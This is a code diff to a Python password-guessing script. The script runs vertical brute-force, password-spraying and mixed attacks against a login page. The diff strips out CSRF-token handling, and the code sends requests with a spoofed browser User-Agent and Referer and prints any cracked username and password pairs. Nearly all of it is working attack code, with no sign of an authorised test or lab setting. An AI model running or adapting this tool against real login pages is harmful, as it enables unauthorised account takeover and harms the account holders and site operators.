@@ -28,25 +28,8 @@ def load_cookie():
         print(f"Error loading cookie: {e}")
         exit(1)
 
-def fetch_csrf_token(session):
-    """Fetch CSRF token from the login page."""
-    response = session.get(LOGIN_URL)
-    if response.status_code != 200:
-        print(f"Failed to retrieve login page. Status code: {response.status_code}")
-        return None
-
-    # Extract CSRF token from the page
-    soup = BeautifulSoup(response.text, 'html.parser')
-    csrf_token = soup.find('input', {'name': 'csrf_token'})
-
-    if csrf_token is None:
-        print("CSRF token not found.")
-        return None
-
-    return csrf_token['value']
-
-def attempt_login(session, username, password, csrf_token):
-    """Attempt to login with given username, password, and CSRF token."""
+def attempt_login(session, username, password):
+    """Attempt to login with given username and password."""
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
         'Referer': LOGIN_URL  # Referer header to mimic browser behavior
@@ -54,8 +37,7 @@ def attempt_login(session, username, password, csrf_token):
 
     login_data = {
         'username': username,
-        'password': password,
-        'csrf_token': csrf_token
+        'password': password
     }
 
     # Perform the login request
@@ -78,13 +60,8 @@ def vertical_brute_force(single_username, sleep_time):
         # Load cookie into the session
         session.cookies.update(load_cookie())
 
-        csrf_token = fetch_csrf_token(session)
-        if csrf_token is None:
-            print("Failed to fetch CSRF token. Aborting.")
-            return
-
         for password in passwords:
-            success, response = attempt_login(session, single_username, password, csrf_token)
+            success, response = attempt_login(session, single_username, password)
 
             if success:
                 print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
@@ -106,12 +83,7 @@ def horizontal_attack(sleep_time):
             print(f"Attempting Password: {password} across all users")
 
             for username in usernames:
-                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
-                if csrf_token is None:
-                    print("Failed to fetch CSRF token. Skipping.")
-                    continue
-
-                success, response = attempt_login(session, username, password, csrf_token)
+                success, response = attempt_login(session, username, password)
 
                 if success:
                     print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
@@ -134,12 +106,7 @@ def mixed_attack(sleep_time):
             print(f"Attempting passwords for Username: {username}")
 
             for password in passwords:
-                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
-                if csrf_token is None:
-                    print("Failed to fetch CSRF token. Skipping.")
-                    continue
-
-                success, response = attempt_login(session, username, password, csrf_token)
+                success, response = attempt_login(session, username, password)
 
                 if success:
                     print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
